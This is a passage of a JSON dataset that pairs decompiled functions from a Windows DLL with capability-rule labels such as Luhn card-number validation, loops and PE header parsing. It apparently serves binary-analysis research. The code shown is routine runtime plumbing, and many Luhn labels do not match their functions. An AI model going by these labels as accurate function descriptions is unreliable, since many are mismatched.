            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008630(int64_t arg1, ulong arg2)\n\n{\n    ulong arg3;\n    ulong arg2_00;\n    \n    arg3 = fcn.1800074f0(arg2);\n    arg2_00 = fcn.1800074f0(*(arg1 + 8));\n    fcn.180007830(*(arg1 + 0x10), arg2_00, arg3);\n    *(arg1 + 8) = *(arg1 + 8) + 1;\n    return;\n}\n",
        "token_count": 116
    },
    "1800136b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800136b4(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x18002c730, 0, lpMem),  iVar2 == 0)) {\n        puVar1 = fcn.18001293c();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.180012884(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "18000993": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180009930(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    \n    arg1 = (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)(0x18002bb90);\n    while (arg1 != NULL) {\n        puVar1 = *arg1;\n        fcn.180010754(arg1);\n        arg1 = puVar1;\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "18000996": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180009968(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x180028548; piVar1 < 0x180028548; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x18001f2c8)();\n        }\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "1800099a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800099a4(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x180028558; piVar1 < 0x180028558; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x18001f2c8)();\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "180008f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.180008f40(void)\n\n{\n    fcn.180011ca0(0);\n    fcn.18000afb8();\n    return 1;\n}\n",
        "token_count": 38
    },
    "18000ce9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000ce94(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x18002bc58;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x18002bc30);\n        *0x18002bc58 = *0x18002bc58 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 114
    },
    "18000d2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000d2c0(ulong arg1, ulong *arg2)\n\n{\n    fcn.18000cee0(arg1, *arg2, 2);\n    return;\n}\n",
        "token_count": 44
    },
    "18000d2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000d2f0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    ulong arg1_00;\n    \n    pcVar1 = fcn.18000cee0(arg1, arg2, arg4);\n    (*pcVar1)(arg3);\n    arg1_00 = fcn.18000cf10();\n    fcn.18000cee0(arg1_00, arg2, 2);\n    return;\n}\n",
        "token_count": 111
    },
    "18001074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001074c(int64_t arg1)\n\n{\n    uint *puVar1;\n    uint64_t uVar2;\n    ulong uVar3;\n    \n    if ((arg1 != 0) && (uVar2 = fcn.1800141ec(arg1, 0x7fff),  uVar2 < 0x7fff)) {\n        fcn.180015310(0xb);\n        uVar3 = fcn.1800106b4(arg1);\n        fcn.180015364(0xb);\n        return uVar3;\n    }\n    puVar1 = fcn.18001293c();\n    *puVar1 = 0x16;\n    fcn.18001097c();\n    return 0;\n}\n",
        "token_count": 166
    },
    "180013cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180013cc0(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x18002c730, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.18001992c();\n        } while ((iVar1 != 0) && (iVar1 = fcn.180010a2c(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.18001293c();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 198
    },
    "18001165": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011650(int64_t *arg1)\n\n{\n    if (*arg1 != *0x18002be70) {\n        fcn.180011558(*arg1);\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "18001166": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001166c(int64_t *arg1)\n\n{\n    if (*arg1 != *0x18002be68) {\n        fcn.180011558(*arg1);\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "1800116f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800116fc(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*0x18002be58 == 0) {\n        fcn.1800167d0();\n        arg1 = fcn.180016cc8();\n        if (arg1 == 0) {\n            uVar2 = 0xffffffff;\n        }\n        else {\n            iVar3 = fcn.18001133c(arg1);\n            iVar1 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0xffffffff;\n                iVar3 = *0x18002be58;\n                iVar1 = *0x18002be70;\n            }\n            *0x18002be70 = iVar1;\n            *0x18002be58 = iVar3;\n            fcn.1800136b4(0);\n        }\n        fcn.1800136b4(arg1);\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 246
    },
    "180011ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180011ab8(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_20h_2;\n    ulong var_28h;\n    ulong var_20h;\n    ulong *var_18h;\n    ulong *var_bp_10h;\n    \n    var_18h = &uStackX8;\n    var_bp_10h = &uStackX16;\n    var_28h._0_4_ = 2;\n    var_20h._0_4_ = 2;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.180011704(&var_20h_2, &var_20h, &var_18h, &var_28h);\n    return;\n}\n",
        "token_count": 192
    },
    "180011ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.180011ca0(void)\n\n{\n    fcn.18001354c();\n    return 1;\n}\n",
        "token_count": 27
    },
    "18001357": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180013570(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x18002c2c8) && ((*0x18002b930 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.180018680(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "1800135a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800135a4(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x18002c538) && ((*0x18002b930 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.180016830(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "18001532": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001532c(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x18002c520;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x18002c2f0);\n        *0x18002c520 = *0x18002c520 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 116
    },
    "18001875": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180018758(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        if (*(arg1 + 0x18) != *0x18002b958) {\n            fcn.1800136b4(*(arg1 + 0x18));\n        }\n        if (*(arg1 + 0x20) != *0x18002b960) {\n            fcn.1800136b4(*(arg1 + 0x20));\n        }\n        if (*(arg1 + 0x28) != *0x18002b968) {\n            fcn.1800136b4(*(arg1 + 0x28));\n        }\n        if (*(arg1 + 0x30) != *0x18002b970) {\n            fcn.1800136b4(*(arg1 + 0x30));\n        }\n        if (*(arg1 + 0x38) != *0x18002b978) {\n            fcn.1800136b4(*(arg1 + 0x38));\n        }\n        if (*(arg1 + 0x40) != *0x18002b980) {\n            fcn.1800136b4(*(arg1 + 0x40));\n        }\n        if (*(arg1 + 0x48) != *0x18002b988) {\n            fcn.1800136b4(*(arg1 + 0x48));\n        }\n        if (*(arg1 + 0x68) != *0x18002b9a8) {\n            fcn.1800136b4(*(arg1 + 0x68));\n        }\n        if (*(arg1 + 0x70) != *0x18002b9b0) {\n            fcn.1800136b4(*(arg1 + 0x70));\n        }\n        if (*(arg1 + 0x78) != *0x18002b9b8) {\n            fcn.1800136b4(*(arg1 + 0x78));\n        }\n        if (*(arg1 + 0x80) != *0x18002b9c0) {\n            fcn.1800136b4(*(arg1 + 0x80));\n        }\n        if (*(arg1 + 0x88) != *0x18002b9c8) {\n            fcn.1800136b4(*(arg1 + 0x88));\n        }\n        if (*(arg1 + 0x90) != *0x18002b9d0) {\n            fcn.1800136b4(*(arg1 + 0x90));\n        }\n    }\n    return;\n}\n",
        "token_count": 576
    },
    "18001886": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180018864(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x18002b940) {\n            fcn.1800136b4(*arg1);\n        }\n        if (arg1[1] != *0x18002b948) {\n            fcn.1800136b4(arg1[1]);\n        }\n        if (arg1[2] != *0x18002b950) {\n            fcn.1800136b4(arg1[2]);\n        }\n        if (arg1[0xb] != *0x18002b998) {\n            fcn.1800136b4(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x18002b9a0) {\n            fcn.1800136b4(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "18001d7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001d7a0(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    fcn.18001d7c0(param_1, param_2, param_3, 0x1b);\n    return;\n}\n",
        "token_count": 60
    },
    "18000afd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.18000afdc(int64_t arg1, uint64_t *arg2)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    \n    if (*(arg1 + 0x10) != 0) {\n        uVar5 = 0;\n        puVar7 = *(arg1 + 0x10) + arg2[1];\n        iVar4 = -1;\n        uVar6 = 0;\n        uVar3 = *puVar7 & 0xf;\n        puVar7 = puVar7 + -*(uVar3 + 0x18001f420);\n        puVar1 = puVar7 + -4;\n        uVar2 = *(uVar3 + 0x18001f430) & 0x1f;\n        if (*puVar1 >> uVar2 != 0) {\n            do {\n                puVar8 = puVar7 + -*((*puVar7 & 0xf) + 0x18001f420);\n                uVar5 = uVar5 + (*(puVar8 + -4) >> (*((*puVar7 & 0xf) + 0x18001f430) & 0x1f));\n                if (*arg2 < uVar5 + *arg2[2] + arg2[1]) break;\n                uVar6 = uVar6 + 1;\n                puVar7 = puVar8 + -*((*puVar8 & 0xf) + 0x18001f420);\n                iVar4 = (*(puVar7 + -4) >> (*((*puVar8 & 0xf) + 0x18001f430) & 0x1f)) - 1;\n            } while (uVar6 < *puVar1 >> uVar2);\n            if (uVar6 != 0) {\n                return iVar4;\n            }\n        }\n    }\n    return -1;\n}\n",
        "token_count": 467
    },
    "180010a1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.180010a14(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x18002c730, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.18001992c();\n        } while ((iVar1 != 0) && (iVar1 = fcn.180010a2c(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.18001293c();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 198
    },
    "180010ea": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.180010eac(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    uint *puStack40;\n    int32_t *piStack32;\n    uchar *puStack24;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 2;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.180010e38(arg1);\n    }\n    puStack40 = auStackX16;\n    auStackX32[0] = 0;\n    piStack32 = aiStackX24;\n    puStack24 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.180010c28(auStack56, auStack48, &puStack40, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.180010dec(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 413
    }
}